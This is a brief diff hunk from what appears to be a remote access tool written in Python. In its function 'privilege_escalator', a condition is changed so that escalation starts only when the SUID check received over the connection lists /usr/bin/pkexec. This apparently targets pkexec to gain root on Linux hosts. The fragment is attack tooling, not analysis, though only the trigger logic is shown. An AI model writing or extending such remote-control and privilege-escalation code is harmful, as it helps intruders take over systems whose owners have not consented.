@@ -250,7 +250,7 @@ def privilege_escalator(user):
     if osname == 'posix':
         SUID = reliable_recv()
         print(f"Result from checking SUID: {SUID}")
-        if "Found" in SUID:
+        if "/usr/bin/pkexec" in SUID:
             print("Starting Escalation")
             while True:
                 check = reliable_recv()
